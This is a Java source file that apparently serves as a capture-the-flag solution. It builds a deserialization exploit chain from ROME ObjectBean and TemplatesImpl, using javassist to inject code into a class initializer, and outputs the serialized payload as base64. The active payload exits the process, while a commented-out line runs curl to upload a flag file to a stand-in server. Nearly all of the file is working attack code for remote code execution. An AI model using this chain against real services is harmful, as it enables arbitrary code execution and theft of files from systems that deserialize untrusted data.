package p;

import javax.xml.transform.Templates;

import com.sun.syndication.feed.impl.ObjectBean;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.Base64;
import java.util.HashMap;

public class Main {

    public static void setField(Object object, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object, value);
    }

    public static HashMap makeMap ( Object v1 ) throws Exception {
        HashMap s = new HashMap();
        setField(s, "size", 1);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object tbl = Array.newInstance(nodeC, 1);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        setField(s, "table", tbl);
        return s;
    }
    public static String classAsFile(final Class<?> clazz, boolean suffix) {
        String str;
        if (clazz.getEnclosingClass() == null) {
            str = clazz.getName().replace(".", "/");
        } else {
            str = classAsFile(clazz.getEnclosingClass(), false) + "$" + clazz.getSimpleName();
        }
        if (suffix) {
            str += ".class";
        }
        return str;
    }
    public static byte[] classAsBytes(final Class<?> clazz) {
        try {
            final byte[] buffer = new byte[1024];
            final String file = classAsFile(clazz, true);
            final InputStream in = Main.class.getClassLoader().getResourceAsStream(file);
            if (in == null) {
                throw new IOException("couldn't find '" + file + "'");
            }
            final ByteArrayOutputStream out = new ByteArrayOutputStream();
            int len;
            while ((len = in.read(buffer)) != -1) {
                out.write(buffer, 0, len);
            }
            return out.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public static <T> T createTemplatesImpl ( Class<T> tplClass, Class<?> abstTranslet )
        throws Exception {
        final T templates = tplClass.newInstance();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(F.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(F.class.getName());
//        String cmd = "java.lang.Runtime.getRuntime().exec(\"curl -T flag your_server.com\");";
        String cmd = "java.lang.System.exit(33);";
        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("o");
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);
        byte[] classBytes = clazz.toBytecode();
        try (FileOutputStream fos = new FileOutputStream("exploit.class")) {
            fos.write(classBytes);
        }
        System.out.println("Length of raw bytecode: " + classBytes.length);
        Field bytecodes = tplClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] secondClassBytes = classAsBytes(F.class);
        System.out.println("Second class byte length:" + secondClassBytes.length);
        bytecodes.set(templates, new byte[][] {
                classBytes, secondClassBytes
        });
        setField(templates, "_name", "_");
        return templates;
    }

    public static Object getPrivateMember(Object object, String name) throws NoSuchFieldException, IllegalAccessException {
        Field f = object.getClass().getDeclaredField(name);
        f.setAccessible(true);
        return f.get(object);
    }

    public static void main(String[] args) throws Exception {
        Templates templates = createTemplatesImpl(TemplatesImpl.class, AbstractTranslet.class);
        ObjectBean objBean1 = new ObjectBean(Templates.class, templates);
        setField(objBean1, "_equalsBean", null);
        setField(objBean1, "_cloneableBean", null);
        ObjectBean objBean2 = new ObjectBean(ObjectBean.class, objBean1);
        setField(objBean2, "_cloneableBean", null);
        Object _equalsBean = getPrivateMember(objBean2, "_equalsBean");
        setField(_equalsBean, "_beanClass", null);
        setField(objBean2, "_toStringBean", null);
        Object payload = makeMap(objBean2);

        ByteArrayOutputStream os = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(os);
        oos.writeObject(payload);
        oos.close();

        byte[] payloadArr = os.toByteArray();
        System.out.println("Byte Array Length: " + payloadArr.length);
        String base64Payload = Base64.getEncoder().encodeToString(payloadArr);
        System.out.println("Base 64 Payload Length:  " + base64Payload.length());
        System.out.println(base64Payload);


        ByteArrayInputStream bais = new ByteArrayInputStream(payloadArr);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        System.out.println("After read object");

    }
}
